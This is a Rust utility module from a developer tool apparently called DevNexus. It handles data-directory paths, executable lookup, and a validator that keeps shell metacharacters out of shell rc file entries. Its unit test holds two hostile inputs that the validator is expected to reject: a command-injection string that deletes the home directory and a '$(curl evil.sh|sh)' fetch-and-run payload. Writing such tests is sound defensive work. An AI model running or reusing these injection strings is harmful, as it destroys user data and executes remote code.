pub mod exec;
pub mod rc_editor;

pub fn data_dir() -> std::path::PathBuf {
    let dir = if cfg!(target_os = "macos") {
        std::env::var("HOME")
            .map(|h| std::path::PathBuf::from(h).join("Library/Application Support/devnexus"))
            .unwrap_or_else(|_| std::path::PathBuf::from("."))
    } else if cfg!(target_os = "windows") {
        std::env::var("APPDATA")
            .map(|h| std::path::PathBuf::from(h).join("devnexus"))
            .unwrap_or_else(|_| std::path::PathBuf::from("."))
    } else {
        std::env::var("XDG_DATA_HOME")
            .map(|h| std::path::PathBuf::from(h).join("devnexus"))
            .or_else(|_| {
                std::env::var("HOME")
                    .map(|h| std::path::PathBuf::from(h).join(".local/share/devnexus"))
            })
            .unwrap_or_else(|_| std::path::PathBuf::from("."))
    };

    // SQLite / 配置写入前确保目录存在；失败时回退到当前目录
    if let Err(e) = std::fs::create_dir_all(&dir) {
        eprintln!(
            "[DevNexus] Warning: cannot create data dir {:?}: {}",
            dir, e
        );
        return std::path::PathBuf::from(".");
    }
    dir
}

pub fn user_home() -> String {
    if cfg!(target_os = "windows") {
        std::env::var("USERPROFILE").unwrap_or_default()
    } else {
        std::env::var("HOME").unwrap_or_default()
    }
}

/// 校验值仅含 URL/路径安全字符，防止注入 shell rc 文件
pub fn validate_rc_value(value: &str) -> Result<(), String> {
    if value.is_empty() || value.len() > 2048 {
        return Err("Value is empty or too long".to_string());
    }
    if value
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || ":/._-~?&=+%#@[],".contains(c))
    {
        Ok(())
    } else {
        Err("Value contains unsafe characters (quotes, shell metacharacters)".to_string())
    }
}

pub fn find_cmd_path(cmd: &str) -> Option<String> {
    if let Ok(p) = which::which(cmd) {
        return Some(p.to_string_lossy().to_string());
    }

    #[cfg(unix)]
    {
        if cmd == "node" || cmd == "npm" || cmd == "npx" {
            if let Ok(home) = std::env::var("HOME") {
                let nvm_base = format!("{}/.nvm/versions/node", home);
                if let Ok(entries) = std::fs::read_dir(&nvm_base) {
                    for entry in entries.flatten() {
                        let bin = entry.path().join("bin").join(cmd);
                        if bin.exists() {
                            return Some(bin.to_string_lossy().to_string());
                        }
                    }
                }
            }
        }

        let common = [
            format!("/usr/local/bin/{}", cmd),
            format!("/opt/homebrew/bin/{}", cmd),
            format!("/snap/bin/{}", cmd),
        ];
        for p in &common {
            if std::path::Path::new(p).exists() {
                return Some(p.clone());
            }
        }
    }

    #[cfg(windows)]
    {
        if let Ok(localappdata) = std::env::var("LOCALAPPDATA") {
            let nvm_base = format!("{}\\nvm", localappdata);
            if let Ok(entries) = std::fs::read_dir(&nvm_base) {
                for entry in entries.flatten() {
                    let bin = entry.path().join(cmd);
                    if bin.exists() {
                        return Some(bin.to_string_lossy().to_string());
                    }
                }
            }
        }
        if let Ok(programfiles) = std::env::var("ProgramFiles") {
            let common = [
                format!("{}\\{}", programfiles, cmd),
                format!(
                    "{} (x86)\\{}",
                    std::env::var("ProgramFiles(x86)").unwrap_or_default(),
                    cmd
                ),
            ];
            for p in &common {
                if std::path::Path::new(p).exists() {
                    return Some(p.clone());
                }
            }
        }
    }

    None
}

#[cfg(test)]
mod tests {
    use super::validate_rc_value;

    #[test]
    fn test_validate_rc_value() {
        assert!(validate_rc_value("https://mirrors.tuna.tsinghua.edu.cn/homebrew/").is_ok());
        assert!(validate_rc_value("/usr/local/bin").is_ok());
        assert!(validate_rc_value("\"; rm -rf ~; #").is_err());
        assert!(validate_rc_value("$(curl evil.sh|sh)").is_err());
        assert!(validate_rc_value("").is_err());
    }
}
